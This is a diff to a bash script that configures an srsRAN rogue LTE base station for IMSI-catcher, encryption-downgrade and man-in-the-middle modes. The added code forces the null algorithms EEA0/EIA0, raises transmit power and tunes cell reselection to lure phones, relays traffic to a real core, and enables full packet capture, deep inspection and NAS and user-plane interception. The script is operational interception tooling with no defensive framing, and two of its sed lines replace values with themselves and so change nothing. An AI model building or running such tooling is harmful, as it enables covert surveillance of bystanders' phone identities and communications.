@@ -20,6 +20,7 @@ NC='\033[0m'
 CONFIG_DIR="/etc/srsran/false"
 ATTACK_PROFILES_DIR="/opt/attack_profiles"
 ATTACK_MODES_CONF="/opt/configs/false/attack_modes.conf"
+SIB_CONFIG_DIR="/etc/srsran/false"
 
 #####################################################################
 # Functions
@@ -205,39 +206,84 @@ set_attack_profile() {
 
 apply_imsi_catcher_config() {
     echo "Applying IMSI catcher configuration..."
-    
+
     # Force EEA0 and EIA0 for no encryption
-    if [ -f "$CONFIG_DIR/enb_4g_rogue.conf" ]; then
-        sudo sed -i '/eea_pref_list/c\eea_pref_list = EEA0, EEA1, EEA2' "$CONFIG_DIR/enb_4g_rogue.conf"
-        sudo sed -i '/eia_pref_list/c\eia_pref_list = EIA0, EIA1, EIA2' "$CONFIG_DIR/enb_4g_rogue.conf"
+    local enb_conf="$CONFIG_DIR/enb.conf"
+    if [ -f "$enb_conf" ]; then
+        sudo sed -i '/eea_pref_list/c\eea_pref_list = EEA0, EEA1, EEA2' "$enb_conf"
+        sudo sed -i '/eia_pref_list/c\eia_pref_list = EIA0, EIA1, EIA2' "$enb_conf"
     fi
-    
+
+    # Increase TX gain for stronger signal to attract UEs
+    if [ -f "$enb_conf" ]; then
+        sudo sed -i 's/tx_gain = [0-9]*/tx_gain = 85/' "$enb_conf"
+    fi
+
+    # Adjust cell reselection parameters to be more attractive
+    if [ -f "$SIB_CONFIG_DIR/sib.conf" ]; then
+        sudo sed -i 's/cell_resel_prio = 7/cell_resel_prio = 7/' "$SIB_CONFIG_DIR/sib.conf"  # Already set to 7
+        sudo sed -i 's/q_offset_freq = -10/q_offset_freq = -10/' "$SIB_CONFIG_DIR/sib.conf"  # Already set to -10
+    fi
+
     echo "  ✓ Encryption disabled (EEA0/EIA0 prioritized)"
+    echo "  ✓ TX gain increased to 85 dB for stronger signal"
+    echo "  ✓ Cell reselection optimized for UE attraction"
     echo "  ✓ Identity capture enabled"
 }
 
 apply_downgrade_config() {
     echo "Applying downgrade attack configuration..."
-    
+
     # Prioritize weak algorithms
-    if [ -f "$CONFIG_DIR/enb_4g_rogue.conf" ]; then
-        sudo sed -i '/eea_pref_list/c\eea_pref_list = EEA0, EEA1' "$CONFIG_DIR/enb_4g_rogue.conf"
-        sudo sed -i '/eia_pref_list/c\eia_pref_list = EIA0, EIA1' "$CONFIG_DIR/enb_4g_rogue.conf"
+    local enb_conf="$CONFIG_DIR/enb.conf"
+    if [ -f "$enb_conf" ]; then
+        sudo sed -i '/eea_pref_list/c\eea_pref_list = EEA0, EEA1' "$enb_conf"
+        sudo sed -i '/eia_pref_list/c\eia_pref_list = EIA0, EIA1' "$enb_conf"
     fi
-    
+
     echo "  ✓ Weak algorithms prioritized"
 }
 
 apply_mitm_config() {
     echo "Applying MITM configuration..."
-    
-    # Enable packet capture
-    if [ -f "$CONFIG_DIR/enb_4g_rogue.conf" ]; then
-        sudo sed -i '/^enable = false/c\enable = true' "$CONFIG_DIR/enb_4g_rogue.conf"
+
+    # Load MITM profile settings
+    if [ -f "$ATTACK_PROFILES_DIR/mitm.conf" ]; then
+        source "$ATTACK_PROFILES_DIR/mitm.conf"
     fi
-    
-    echo "  ✓ Packet capture enabled"
-    echo "  ✓ Traffic interception configured"
+
+    # Configure core network relay
+    local enb_conf="$CONFIG_DIR/enb.conf"
+    if [ "$RELAY_TO_REAL_CORE" == "true" ]; then
+        if [ -f "$enb_conf" ]; then
+            # Ensure MME address points to real core
+            sudo sed -i "s|mme_addr = .*|mme_addr = $REAL_CORE_MME_IP|" "$enb_conf"
+        fi
+        echo "  ✓ Relay to real core network enabled (MME: $REAL_CORE_MME_IP)"
+    fi
+
+    # Enable packet capture for interception
+    if [ "$CAPTURE_ALL_TRAFFIC" == "true" ] && [ -n "$CAPTURE_PCAP" ]; then
+        # Create capture directory
+        sudo mkdir -p "$(dirname "$CAPTURE_PCAP")"
+        echo "  ✓ Full traffic capture enabled: $CAPTURE_PCAP"
+    fi
+
+    # Configure DPI if enabled
+    if [ "$DPI_ENABLED" == "true" ] && [ -n "$DPI_LOG" ]; then
+        sudo mkdir -p "$(dirname "$DPI_LOG")"
+        echo "  ✓ Deep packet inspection enabled: $DPI_LOG"
+    fi
+
+    # Set up traffic interception
+    if [ "$INTERCEPT_NAS_MESSAGES" == "true" ] || [ "$INTERCEPT_USER_PLANE" == "true" ]; then
+        echo "  ✓ Traffic interception configured"
+        echo "    - NAS messages: $INTERCEPT_NAS_MESSAGES"
+        echo "    - User plane: $INTERCEPT_USER_PLANE"
+        echo "    - Control plane: $INTERCEPT_CONTROL_PLANE"
+    fi
+
+    echo "  ✓ MITM attack fully configured"
 }
 
 apply_dos_config() {
